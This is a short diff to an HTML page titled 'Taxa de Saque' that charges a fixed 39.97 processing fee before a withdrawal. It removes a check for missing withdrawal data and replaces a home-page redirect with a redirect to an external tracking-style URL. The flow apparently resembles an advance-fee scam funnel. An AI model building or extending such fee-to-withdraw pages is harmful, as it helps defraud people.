@@ -7,7 +7,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Taxa de Saque</title>
     <script src="https://unpkg.com/lucide@latest"></script>
-    <link rel="stylesheet" href="css/taxa.css">
+    <link rel="stylesheet" href="css/taxa.css">   
 </head>
 
 <body>
@@ -79,10 +79,6 @@
 
         const withdrawalData = JSON.parse(sessionStorage.getItem('withdrawalData'));
 
-        if (!withdrawalData) {
-            window.location.href = '/';
-        }
-
         const amount = parseFloat(withdrawalData.amount.replace(',', '.')); 
         const processingFee = 39.97; 
         const totalAmount = amount;
@@ -102,7 +98,7 @@
                 await new Promise(resolve => setTimeout(resolve, 1500));
 
                 setTimeout(() => {
-                    window.location.href = '/';
+                    window.location.href = 'https://redirect.urusoficial.com.br/V06NODAQG8M4R';
                 }, 2000);
             } catch (error) {
                 button.classList.remove('loading');
